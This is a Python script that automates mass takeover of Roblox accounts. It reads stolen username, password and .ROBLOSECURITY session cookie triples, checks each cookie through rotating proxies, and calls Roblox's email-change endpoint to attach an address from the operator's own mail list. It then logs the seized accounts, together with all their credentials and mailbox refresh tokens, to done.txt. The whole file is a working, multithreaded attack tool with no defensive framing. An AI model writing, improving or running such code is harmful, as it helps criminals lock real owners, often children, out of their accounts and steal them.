import requests
import time
import re
import urllib.parse
from loguru import logger
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
import sys
from typing import Optional, Tuple
import string
from datetime import datetime, timezone
from typing import List, Dict, Any

# Global lock for file writes
write_lock = threading.Lock()
# Global flag for graceful shutdown
shutdown_flag = threading.Event()
# Global list to store available emails
available_emails = []
# Lock for email access
email_lock = threading.Lock()

class EmailUpdateError(Exception):
    """Custom exception for email update failures"""
    pass

def signal_handler(signum, frame):
    """Handle Ctrl+C gracefully"""
    logger.warning("Received interrupt signal. Shutting down gracefully...")
    shutdown_flag.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def safe_request(func, *args, max_retries=3, **kwargs):
    """Wrapper for safe HTTP requests with retries"""
    for attempt in range(max_retries):
        if shutdown_flag.is_set():
            raise EmailUpdateError("Shutdown requested")
        
        try:
            return func(*args, **kwargs)
        except requests.exceptions.RequestException as e:
            logger.warning(f"Request failed (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt == max_retries - 1:
                raise EmailUpdateError(f"Request failed after {max_retries} attempts: {e}")
            time.sleep(2 ** attempt)

def validate_cookie(cookie: str, proxy: str = None) -> bool:
    """Validate if cookie is still valid"""
    session = requests.Session()
    if proxy:
        session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    headers = {
        "cookie": f".ROBLOSECURITY={cookie};",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
    }
    
    try:
        resp = session.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def remove_processed_account(account_line: str, accounts_file: str = 'accounts.txt'):
    """Remove processed account from accounts.txt file"""
    with write_lock:
        try:
            with open(accounts_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            account_with_newline = account_line.strip() + '\n'
            updated_lines = [line for line in lines if line != account_with_newline]
            
            if account_line.strip() + '\n' not in lines:
                updated_lines = [line for line in lines if line.strip() != account_line.strip()]
            
            with open(accounts_file, 'w', encoding='utf-8') as f:
                f.writelines(updated_lines)
            
            logger.debug(f"Removed processed account from {accounts_file}: {account_line.split(':')[0] if ':' in account_line else 'Unknown'}")
            
        except Exception as e:
            logger.error(f"Failed to remove processed account from file: {e}")

def remove_used_email(email_data: str, mail_file: str = 'mail.txt'):
    """Remove used email from mail.txt file"""
    with write_lock:
        try:
            with open(mail_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            email_with_newline = email_data.strip() + '\n'
            updated_lines = [line for line in lines if line != email_with_newline]
            
            # Also check without newline in case format is different
            if email_data.strip() + '\n' not in lines:
                updated_lines = [line for line in lines if line.strip() != email_data.strip()]
            
            with open(mail_file, 'w', encoding='utf-8') as f:
                f.writelines(updated_lines)
            
            email_address = email_data.split(':')[0] if ':' in email_data else 'Unknown'
            logger.debug(f"Removed used email from {mail_file}: {email_address}")
            
        except Exception as e:
            logger.error(f"Failed to remove used email from file: {e}")

def get_email_from_file() -> Optional[Tuple[str, str, str, str, str]]:
    """Get an available email from the mail.txt file and return the original line too"""
    global available_emails
    
    with email_lock:
        if not available_emails:
            logger.error("No available emails in mail.txt")
            return None
        
        # Get the first available email and remove it from the list
        email_data = available_emails.pop(0)
        parts = email_data.split(":")
        
        if len(parts) != 4:
            logger.error(f"Invalid email format: {email_data}")
            return None
        
        mail, mail_password, refresh_token, client_id = parts
        logger.info(f"Using email: {mail}")
        
        # Write used email to file
        write_used_email(mail, mail_password, refresh_token, client_id)
        
        return mail, mail_password, refresh_token, client_id, email_data

def write_used_email(mail: str, mail_password: str, refresh_token: str, client_id: str):
    """Write used email to file"""
    with write_lock:
        try:
            with open("used_emails.txt", "a", encoding="utf-8") as f:
                f.write(f"{mail}:{mail_password}:{refresh_token}:{client_id}\n")
        except Exception as e:
            logger.error(f"Failed to write used email: {e}")

def update_email_only(cookie: str, username: str, password: str, proxies: list,
                     max_retries: int = 3) -> Optional[Tuple[str, str, str, str, str]]:
    """Main function to update email only (no verification)"""
    logger.info(f"Starting email update process for username: {username}")
    
    try:
        # 1) Get email from file
        email_result = get_email_from_file()
        if not email_result:
            logger.error(f"No available emails for {username}")
            return None
        
        mail, mail_password, refresh_token, client_id, original_email_data = email_result
        
        # 2) Update the Roblox account's email
        if not update_roblox_email(cookie, password, mail, proxies, max_retries):
            return None
        
        # Write successful account (email updated but not verified)
        write_successful_account(username, password, cookie, mail, mail_password, refresh_token, client_id)
        logger.success(f"Email updated successfully for {username}: {mail}")
        
        return mail, mail_password, refresh_token, client_id, original_email_data
    
    except EmailUpdateError as e:
        logger.error(f"Email update failed for {username}: {e}")
        write_failed_account(username, password, cookie)
        return None
    except Exception as e:
        logger.error(f"Unexpected error for {username}: {e}")
        write_failed_account(username, password, cookie)
        return None

def update_roblox_email(cookie: str, password: str, email: str, proxies: list, max_retries: int) -> bool:
    """Update Roblox email with retry logic"""
    for attempt in range(max_retries):
        if shutdown_flag.is_set():
            raise EmailUpdateError("Shutdown requested")
        
        proxy = random.choice(proxies)
        logger.info(f"Attempting to update email with proxy: {proxy}")
        
        # Validate cookie before attempting update
        if not validate_cookie(cookie, proxy):
            logger.error(f"Invalid cookie for email update")
            return False
        
        try:
            resp = update_email(email, password, cookie, proxy)
            if resp and resp.status_code == 200:
                logger.success(f"Email updated successfully with proxy {proxy}")
                return True
                    
        except Exception as e:
            logger.warning(f"Update email attempt {attempt + 1} failed: {e}")
        
        if attempt < max_retries - 1:
            time.sleep(2)
    
    logger.error("Failed to update email after all retries")
    return False

def update_email(new_email: str, password: str, cookie: str, proxy: str = None) -> Optional[requests.Response]:
    """Update email address"""
    session = requests.Session()
    proxies_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}",
    } if proxy else None
    
    session.proxies.update(proxies_dict or {})
    
    url = "https://accountsettings.roblox.com/v1/email"
    payload = {"emailAddress": new_email, "password": password}
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8",
        "cookie": f".ROBLOSECURITY={cookie};",
        "origin": "https://www.roblox.com",
        "referer": "https://www.roblox.com/",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/132.0.0.0 Safari/537.36"
        ),
    }
    
    resp = safe_request(session.post, url, json=payload, headers=headers, timeout=30)
    
    token = resp.headers.get("x-csrf-token")
    if token:
        headers["x-csrf-token"] = token
        resp = safe_request(session.post, url, json=payload, headers=headers, timeout=30)
    
    return resp

def write_failed_account(username: str, password: str, cookie: str):
    """Write failed account to file"""
    with write_lock:
        try:
            with open("failedemail.txt", "a", encoding="utf-8") as f:
                f.write(f"{username}:{password}:{cookie}\n")
        except Exception as e:
            pass

def write_successful_account(username: str, password: str, cookie: str, mail: str, 
                           mail_password: str, refresh_token: str, client_id: str):
    """Write successful account to done.txt file with new format"""
    with write_lock:
        try:
            with open("done.txt", "a", encoding="utf-8") as f:
                f.write(f"{username}:{password}:{cookie}:{mail}:{mail_password}:{refresh_token}:{client_id}\n")
        except Exception as e:
            logger.error(f"Failed to write successful account: {e}")

def load_emails_from_file(mail_file: str = 'mail.txt') -> bool:
    """Load emails from mail.txt file"""
    global available_emails
    
    try:
        with open(mail_file, 'r', encoding='utf-8') as f:
            available_emails = [line.strip() for line in f if line.strip()]
        
        if not available_emails:
            logger.error(f"No emails found in {mail_file}")
            return False
        
        logger.info(f"Loaded {len(available_emails)} emails from {mail_file}")
        return True
    
    except FileNotFoundError:
        logger.error(f"File {mail_file} not found")
        return False
    except Exception as e:
        logger.error(f"Error reading {mail_file}: {e}")
        return False

def process_account(account_line: str, proxies: list) -> bool:
    """Process a single account and remove it from accounts.txt when done"""
    success = False
    username, password, cookie = None, None, None
    used_email_data = None
    
    try:
        parts = account_line.strip().split(":", 2)
        if len(parts) != 3:
            logger.error(f"Invalid line format: {account_line}")
            return False
        
        username, password, cookie = parts
        result = update_email_only(
            cookie=cookie, 
            username=username, 
            password=password, 
            proxies=proxies
        )
        
        if result:
            # Extract the original email data from the result
            used_email_data = result[4]  # The 5th element contains the original email line
            logger.info(f"Email update succeeded for {username}: {result[:4]}")
            success = True
        else:
            logger.error(f"Email update failed for account: {username}")
            write_failed_account(username, password, cookie)
            success = False
    
    except Exception as e:
        logger.error(f"Unexpected error processing account {account_line}: {e}")
        if username and password and cookie:
            write_failed_account(username, password, cookie)
        success = False
    
    finally:
        # Always remove the processed account
        remove_processed_account(account_line)
        
        # Remove the used email from mail.txt if we have the data
        if used_email_data:
            remove_used_email(used_email_data)
    
    return success

def main():
    """Main function"""
    cookies_file = 'accounts.txt'
    proxies_file = 'proxies.txt'
    mail_file = 'mail.txt'
    
    try:
        num_threads = int(input("Enter the number of threads you want to use: "))
        if num_threads <= 0:
            raise ValueError("Number of threads must be positive")
    except ValueError as e:
        logger.error(f"Invalid thread count: {e}")
        return
    
    try:
        with open(cookies_file, 'r', encoding='utf-8') as f:
            accounts = [line.strip() for line in f if line.strip()]
        with open(proxies_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        logger.error(f"File not found: {e}")
        return
    except Exception as e:
        logger.error(f"Error reading files: {e}")
        return
    
    # Load emails from file
    if not load_emails_from_file(mail_file):
        return
    
    if not accounts:
        logger.error("No accounts found in accounts.txt")
        return
    if not proxies:
        logger.error("No proxies found in proxies.txt")
        return
    if len(available_emails) < len(accounts):
        logger.warning(f"Warning: You have {len(accounts)} accounts but only {len(available_emails)} emails. "
                      f"Some accounts may fail due to insufficient emails.")
    
    logger.info(f"Processing {len(accounts)} accounts with {num_threads} threads")
    logger.info(f"Available emails: {len(available_emails)}")
    
    completed = 0
    failed = 0
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        future_to_account = {
            executor.submit(process_account, account, proxies): account 
            for account in accounts
        }
        
        try:
            for future in as_completed(future_to_account):
                if shutdown_flag.is_set():
                    break
                
                account = future_to_account[future]
                try:
                    success = future.result(timeout=300)
                    if success:
                        completed += 1
                    else:
                        failed += 1
                    
                    logger.info(f"Progress: {completed + failed}/{len(accounts)} "
                              f"(Success: {completed}, Failed: {failed}, Remaining emails: {len(available_emails)})")
                
                except Exception as e:
                    failed += 1
                    logger.error(f"Task failed for {account}: {e}")
        
        except KeyboardInterrupt:
            logger.warning("Interrupted by user")
            shutdown_flag.set()
    
    logger.info(f"All tasks completed. Success: {completed}, Failed: {failed}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()